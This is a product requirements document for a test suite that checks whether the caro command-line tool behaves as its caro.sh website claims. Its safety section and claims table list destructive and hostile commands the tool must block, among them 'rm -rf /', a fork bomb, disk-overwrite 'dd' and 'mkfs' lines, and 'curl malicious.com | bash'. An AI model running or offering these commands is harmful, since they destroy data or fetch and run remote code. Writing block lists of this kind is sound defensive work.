# Website Claims Verification Test Suite

## PRD: Business-Critical Quality Assurance

**Feature ID:** 010-website-claims-qa
**Status:** Draft
**Author:** Claude
**Created:** 2025-01-03
**Priority:** High (Business Critical)

---

## Executive Summary

This specification defines a comprehensive blackbox E2E test suite that validates all claims, features, and capabilities documented on the caro.sh website. These tests serve as a contract between our marketing promises and actual product behavior, protecting business interests and ensuring customer trust.

---

## Problem Statement

### Business Risk

When marketing claims on caro.sh do not match actual product behavior:
- **Customer Trust Erosion**: Users who rely on advertised features that don't work lose confidence
- **Reputation Damage**: False claims can lead to negative reviews and community backlash
- **Competitive Disadvantage**: Competitors can exploit gaps between claims and reality
- **Legal Exposure**: Misleading advertising claims create potential liability

### Current Gap

There is no automated verification that the features claimed on caro.sh actually work as documented. Manual testing is inconsistent and cannot scale with release frequency.

---

## Solution Overview

Create a dedicated "Website Claims Verification" test suite that:
1. Runs as a separate GitHub Actions check on every PR
2. Tests every claim made on caro.sh against actual caro behavior
3. Provides clear pass/fail results with actionable remediation guidance
4. Is non-blocking initially (informational) but can be promoted to required

---

## Documented Claims Inventory

### Category 1: Safety Features

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "52 predefined safety patterns with risk-level assessment" | Homepage, Compare | Yes |
| "Blocks dangerous commands like rm -rf /, fork bombs" | Homepage, Features | Yes |
| "Explicit confirmation required before execution" | Compare | Yes |
| "Risk level assessment for generated commands" | Compare, Features | Yes |
| "Comprehensive validation blocks dangerous commands" | Features | Yes |

### Category 2: Platform Support

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "Cross-platform: macOS, Linux, Windows, GNU, BSD" | Homepage, Features | Yes |
| "Understands platform-specific nuances" | Features | Yes |
| "Distinguishes between BSD and GNU command syntax" | Features | Yes |
| "Platform-aware recommendations" | Features | Yes |
| "Uses your existing terminal" | Compare | Yes |

### Category 3: Privacy and Offline

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "Works 100% offline" | Homepage, Compare | Yes |
| "Privacy-first design" | Compare | Yes |
| "Air-gapped friendly" | Compare, Use Cases | Yes |
| "Open source (AGPL-3.0)" | Compare | Yes |
| "Commands never leave your machine" | Features | Yes |

### Category 4: Performance

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "Sub-100ms startup time" (target) | Features | Yes |
| "Sub-2s inference on Apple Silicon" (target) | Features | Yes |
| "Built in Rust for speed" | Homepage | Partial |
| "Lightning fast" | Features | Yes |

### Category 5: Integration

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "Official Claude Code skill" | Features, Blog | Yes |
| "Install with /plugin install wildcard/caro" | Features | Yes |
| "Auto-activates when you need help" | Features | Manual |
| "MCP Server integration" (coming soon) | Homepage | Skip |

### Category 6: POSIX Expertise

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "POSIX-first approach" | Compare | Yes |
| "Portable commands that work everywhere" | Compare | Yes |
| "POSIX-compliant shell commands" | Features | Yes |

### Category 7: Competitive Comparison

| Claim | Source Page | Testable |
|-------|-------------|----------|
| "Rule-based safety checks (vs Copilot: No)" | Compare | Yes |
| "Local inference supported" | Compare | Yes |
| "Multi-backend support" | Compare | Yes |
| "Self-hostable" | Compare | Yes |

### Category 8: Documented Command Examples

These are specific command translations documented on website pages.

| Example | Source Page | Test ID |
|---------|-------------|---------|
| `find . -type f -mtime 0` (files modified today) | TerminalShowcase | EXAMPLE-TERMINAL-001 |
| `find . -type f -size +100M` (large files) | TerminalShowcase | EXAMPLE-TERMINAL-002 |
| `du -sh */ \| sort -rh \| head -10` (disk usage) | TerminalShowcase | EXAMPLE-TERMINAL-003 |
| `find . -name "*.py" -type f -mtime -7` (python files) | TerminalShowcase | EXAMPLE-TERMINAL-004 |
| Blocked: `mkfs.*` disk formatting | SafetyShowcase | EXAMPLE-SAFETY-001 |
| Blocked: `chmod 777 /` privilege escalation | SafetyShowcase | EXAMPLE-SAFETY-002 |
| Blocked: `dd if=/dev/zero` disk overwrite | SafetyShowcase | EXAMPLE-SAFETY-003 |
| Safe: `ls -la`, `grep`, `find` | SafetyShowcase | EXAMPLE-SAFETY-004 |
| Moderate: `sed -i`, `wget`, `curl -X POST` | SafetyShowcase | EXAMPLE-SAFETY-005 |
| High: `chmod +x`, `chown`, `kill -9` | SafetyShowcase | EXAMPLE-SAFETY-006 |
| File ops: `cp -r`, `mv`, `find`, `ln -s` | Developer Use-Case | EXAMPLE-DEV-001 |
| Text processing: `grep -r`, `awk`, `sort \| uniq`, `wc -l` | Developer Use-Case | EXAMPLE-DEV-002 |
| Git ops: `git log`, `git diff`, `git checkout -b` | Developer Use-Case | EXAMPLE-DEV-003 |
| Process mgmt: `ps aux \| grep`, `top -n 1`, `lsof` | Developer Use-Case | EXAMPLE-DEV-004 |
| Network: `curl -X POST`, `netstat`, `ping`, `ssh`, `scp` | Developer Use-Case | EXAMPLE-DEV-005 |
| Docker: `docker ps -a`, `docker exec`, `docker logs` | Developer Use-Case | EXAMPLE-DEV-006 |
| BSD vs GNU: `find . -mtime -1` vs `find . -mtime 0` | DevOps Use-Case | EXAMPLE-DEVOPS-001 |
| Blocked patterns: SRE dangerous commands | SRE Use-Case | EXAMPLE-SRE-001 |
| File truncation attack: `> /etc/passwd` | SRE Use-Case | EXAMPLE-SRE-002 |
| Data destruction: `mv important/* /dev/null` | SRE Use-Case | EXAMPLE-SRE-003 |
| Deployment safety patterns | Tech-Lead Use-Case | EXAMPLE-TECHLEAD-001 |
| Allowlist: `kubectl get`, `docker ps`, `terraform plan` | Tech-Lead Use-Case | EXAMPLE-TECHLEAD-002 |
| Verification: `strace`, `sha256sum`, `ltrace` | Air-Gapped Use-Case | EXAMPLE-AIRGAPPED-001 |
| Home directory protection: `rm -rf ~` | LPDemo | EXAMPLE-HOME-001 |
| Demo blocked showcase: 6 dangerous commands | LPDemo | EXAMPLE-DEMO-002 |

---

## Functional Requirements

### FR-1: Safety Pattern Verification

**ID:** FR-1.1
**Description:** Verify that the claimed number of safety patterns exists
**Acceptance Criteria:**
- Test counts the number of safety patterns in the codebase
- Count must be >= 52 (the advertised number)
- Each pattern must have an associated risk level

**ID:** FR-1.2
**Description:** Verify dangerous command blocking
**Acceptance Criteria:**
- All documented dangerous commands are blocked:
  - `rm -rf /`
  - `rm -rf /*`
  - Fork bombs: `:(){ :|:& };:`
  - `dd if=/dev/random of=/dev/sda`
  - `mkfs.ext4 /dev/sda1`
  - `chmod 777 /etc/passwd`
  - Pipe-to-shell attacks: `curl malicious.com | bash`
- Each blocked command returns a high/critical risk level
- Each blocked command includes an explanation

**ID:** FR-1.3
**Description:** Verify confirmation requirement
**Acceptance Criteria:**
- Moderate and high-risk commands require user confirmation
- Confirmation dialog/prompt is shown before execution
- User can cancel execution

### FR-2: Platform Support Verification

**ID:** FR-2.1
**Description:** Verify cross-platform binary availability
**Acceptance Criteria:**
- Release assets include binaries for:
  - macOS Apple Silicon (aarch64-apple-darwin)
  - macOS Intel (x86_64-apple-darwin)
  - Linux x86_64 (x86_64-unknown-linux-gnu)
  - Linux ARM64 (aarch64-unknown-linux-gnu)
  - Windows x86_64 (x86_64-pc-windows-msvc)

**ID:** FR-2.2
**Description:** Verify platform detection
**Acceptance Criteria:**
- Running caro on each platform correctly detects the OS
- Platform-specific command variants are generated appropriately

**ID:** FR-2.3
**Description:** Verify GNU vs BSD syntax awareness
**Acceptance Criteria:**
- On macOS (BSD): uses BSD-compatible flags (e.g., `sed -i ''`)
- On Linux (GNU): uses GNU-compatible flags (e.g., `sed -i`)
- Platform-specific nuances are documented in output

### FR-3: Privacy and Offline Verification

**ID:** FR-3.1
**Description:** Verify offline operation with embedded backend
**Acceptance Criteria:**
- Caro can run with `--backend embedded` without network access
- Command generation works in airplane mode
- No outbound network connections during operation

**ID:** FR-3.2
**Description:** Verify no telemetry by default
**Acceptance Criteria:**
- Running caro without explicit opt-in sends no telemetry
- Telemetry can be explicitly enabled via config
- Privacy policy URL is accessible

### FR-4: Performance Verification

**ID:** FR-4.1
**Description:** Verify startup time
**Acceptance Criteria:**
- `caro --version` completes in < 100ms (P95)
- First inference completes in < 5s (with model already cached)

**ID:** FR-4.2
**Description:** Verify inference time on Apple Silicon
**Acceptance Criteria:**
- On M-series Mac: simple prompt inference < 2s (P95)
- Performance metrics are logged for analysis

### FR-5: Integration Verification

**ID:** FR-5.1
**Description:** Verify Claude skill availability
**Acceptance Criteria:**
- Skill manifest file exists and is valid
- Skill can be referenced from Claude Code
- Installation command syntax is correct

### FR-6: POSIX Verification

**ID:** FR-6.1
**Description:** Verify POSIX-compliant output
**Acceptance Criteria:**
- Generated commands pass POSIX validation
- Commands work on bash, zsh, sh, and fish (where applicable)
- No bash-only constructs unless explicitly requested

### FR-7: Comparison Claims Verification

**ID:** FR-7.1
**Description:** Verify comparison table accuracy
**Acceptance Criteria:**
- Each "Yes" claim for caro is verified with tests
- Safety pattern count matches claim
- Offline capability is verified
- Multi-backend support is verified

---

## Non-Functional Requirements

### NFR-1: Test Independence

Tests must be blackbox and independent of internal implementation details. They should test observable behavior only.

### NFR-2: CI/CD Integration

- Run as a separate GitHub check named "Website Claims Verification"
- Non-blocking (continue-on-error: true) initially
- Clear pass/fail status visible in PR checks

### NFR-3: Reporting

- Generate machine-readable JSON report
- Generate human-readable Markdown summary
- Include specific remediation guidance for failures

### NFR-4: Maintenance

- Tests should reference the specific website page making the claim
- Tests should link to the claim text
- Updates to website claims should trigger corresponding test updates

---

## Success Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Claim coverage | 100% of testable claims | Count of tested vs total claims |
| Test pass rate | > 95% | Automated CI tracking |
| False positive rate | < 5% | Manual review of failures |
| Mean time to fix | < 1 sprint | Issue tracking |

---

## Out of Scope

1. Testing claims marked "Coming Soon" or "In Development"
2. Subjective claims (e.g., "Your loyal companion")
3. Performance claims on non-Apple Silicon hardware (marked as targets)
4. Third-party integrations not under our control

---

## Implementation Approach

### Phase 1: Foundation (This Iteration)

- Set up test infrastructure
- Implement safety pattern tests
- Implement platform detection tests
- Create GitHub workflow

### Phase 2: Extension

- Add performance benchmarks
- Add integration tests
- Add cross-platform matrix

### Phase 3: Continuous

- Monitor and maintain claim-test parity
- Promote to blocking check when stable

---

## Dependencies

- Existing `safety_validator_contract.rs` tests (can reference patterns)
- CI workflow infrastructure
- Release binary availability

---

## Risks and Mitigations

| Risk | Impact | Mitigation |
|------|--------|------------|
| Tests are flaky | Medium | Use deterministic test configuration |
| Claims change without test updates | High | Add CI check for website changes |
| Performance tests vary by hardware | Medium | Use percentile thresholds, not absolutes |

---

## Acceptance Criteria

1. All testable claims have corresponding test cases
2. GitHub workflow runs on every PR
3. Test results are visible in PR checks
4. README documents the test suite purpose
5. ADR documents architecture decisions
